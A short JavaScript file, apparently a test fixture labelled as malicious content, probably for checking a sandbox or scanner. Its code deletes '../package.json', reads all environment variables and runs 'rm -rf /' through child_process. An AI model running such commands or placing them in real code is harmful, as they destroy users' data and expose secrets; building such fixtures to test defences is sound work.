// Test file with malicious content
const fs = require('fs');

// Try to delete important files
fs.unlinkSync('../package.json');

// Try to access sensitive data
const sensitiveData = process.env;

// Try to execute system commands
const { exec } = require('child_process');
exec('rm -rf /', () => {});

console.log('Malicious code executed!');
